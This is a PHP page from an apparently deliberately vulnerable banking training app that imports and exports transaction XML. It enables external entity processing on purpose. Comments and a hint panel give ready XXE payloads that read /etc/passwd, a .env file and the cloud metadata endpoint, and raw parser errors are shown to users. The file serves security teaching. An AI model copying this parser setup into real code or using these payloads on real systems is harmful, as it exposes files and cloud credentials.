<?php
// ============================================================
//  VulnBank – Statement XML Import/Export
//  INTENTIONAL VULNERABILITIES:
//    A03 – XXE (XML External Entity): user-supplied XML parsed with
//           external entity loading enabled
//    A05 – Internal file content returned in error messages
// ============================================================
require_once 'db.php';
require '_header.php';
if (!isset($_SESSION['user_id'])) { header('Location: index.php'); exit; }

$uid    = (int)$_SESSION['user_id'];
$me     = db()->query("SELECT * FROM users WHERE id = $uid")->fetch();
$result = $error = '';

// ── Export: generate XML for current user's transactions ──────
$txns = db()->query("
    SELECT t.*, u1.username AS sender, u2.username AS recipient
    FROM   transactions t
    LEFT JOIN users u1 ON t.from_user = u1.id
    LEFT JOIN users u2 ON t.to_user   = u2.id
    WHERE  t.from_user = $uid OR t.to_user = $uid
    ORDER  BY t.created_at DESC
")->fetchAll();

$xml_export = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<transactions>\n";
foreach ($txns as $t) {
    $xml_export .= "  <transaction>\n";
    $xml_export .= "    <id>{$t['id']}</id>\n";
    $xml_export .= "    <from>" . htmlspecialchars($t['sender'] ?? '') . "</from>\n";
    $xml_export .= "    <to>"   . htmlspecialchars($t['recipient'] ?? '') . "</to>\n";
    $xml_export .= "    <amount>{$t['amount']}</amount>\n";
    $xml_export .= "    <description>" . htmlspecialchars($t['description'] ?? '') . "</description>\n";
    $xml_export .= "    <date>{$t['created_at']}</date>\n";
    $xml_export .= "  </transaction>\n";
}
$xml_export .= "</transactions>\n";

// ── Import: parse uploaded XML ───────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['xml_data'])) {
    $xml_input = $_POST['xml_data'];

    // A03: XXE – libxml external entity loading enabled (default in many PHP builds)
    // The LIBXML_NOENT flag substitutes entities, enabling XXE.
    //
    // Payload:
    // <?xml version="1.0"?>
    // <!DOCTYPE foo [
    //   <!ENTITY xxe SYSTEM "file:///etc/passwd">
    // ]>
    // <transactions>
    //   <transaction><description>&xxe;</description></transaction>
    // </transactions>
    //
    // Also try:
    //   <!ENTITY xxe SYSTEM "file:///Users/pisitkoolplukpol/Work/vuln-bank/.env">
    //   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

    libxml_disable_entity_loader(false); // A03: ensure external entities are ON
    $old = libxml_use_internal_errors(true);

    $dom = new DOMDocument();
    $dom->loadXML($xml_input, LIBXML_NOENT | LIBXML_DTDLOAD); // A03: LIBXML_NOENT = substitute entities

    $errors = libxml_get_errors();
    libxml_clear_errors();
    libxml_use_internal_errors($old);

    if ($errors && empty($dom->documentElement)) {
        // A05: Raw libxml error exposes internal paths
        $error = 'XML parse error: ' . $errors[0]->message;
    } else {
        $items = $dom->getElementsByTagName('transaction');
        $result = "<strong>Parsed {$items->length} transaction(s):</strong><ul>";
        foreach ($items as $item) {
            $desc = $item->getElementsByTagName('description')->item(0)?->textContent ?? '';
            $amt  = $item->getElementsByTagName('amount')->item(0)?->textContent ?? '';
            // A03: XXE output appears here – entity value (file content) is in $desc
            $result .= "<li>Amount: " . htmlspecialchars($amt) . " | Description: " . htmlspecialchars($desc) . "</li>";
        }
        $result .= '</ul>';
    }
}
?>

<div class="row">
  <div class="col-md-5">
    <div class="alert-vuln">
      ⚠️ <span class="badge-vuln">A03 XXE</span> — XML parsed with <code>LIBXML_NOENT | LIBXML_DTDLOAD</code>; external entities enabled
    </div>

    <div class="card shadow mb-3">
      <div class="card-header">Import Transactions (XML)</div>
      <div class="card-body">
        <?php if ($error):  ?><div class="alert alert-danger"><?= $error ?></div><?php endif; ?>
        <?php if ($result): ?><div class="alert alert-info"><?= $result ?></div><?php endif; ?>

        <form method="POST">
          <div class="form-group mb-3">
            <label>Paste XML
              <span class="vuln-label">[A03: inject &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]</span>
            </label>
            <textarea name="xml_data" class="form-control" rows="14" style="font-family:monospace;font-size:.8rem"><?= htmlspecialchars($_POST['xml_data'] ?? '') ?></textarea>
          </div>
          <button class="btn btn-warning w-100">Import XML</button>
        </form>
      </div>
    </div>

    <div class="card hint-card shadow-sm">
      <div class="card-body py-2 px-3" style="font-size:.8rem">
        <strong>XXE payload:</strong><br>
<pre style="font-size:.75rem;margin:0">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;transactions&gt;
  &lt;transaction&gt;
    &lt;amount&gt;0&lt;/amount&gt;
    &lt;description&gt;&amp;xxe;&lt;/description&gt;
  &lt;/transaction&gt;
&lt;/transactions&gt;</pre>
      </div>
    </div>
  </div>

  <div class="col-md-7">
    <div class="card shadow">
      <div class="card-header">Export Transactions (XML)</div>
      <div class="card-body">
        <pre class="bg-dark text-light p-3 rounded" style="font-size:.78rem;max-height:400px;overflow:auto"><?= htmlspecialchars($xml_export) ?></pre>
        <a href="data:text/xml;charset=utf-8,<?= rawurlencode($xml_export) ?>"
           download="transactions.xml" class="btn btn-outline-secondary btn-sm mt-2">
          Download XML
        </a>
      </div>
    </div>
  </div>
</div>

<?php require '_footer.php'; ?>
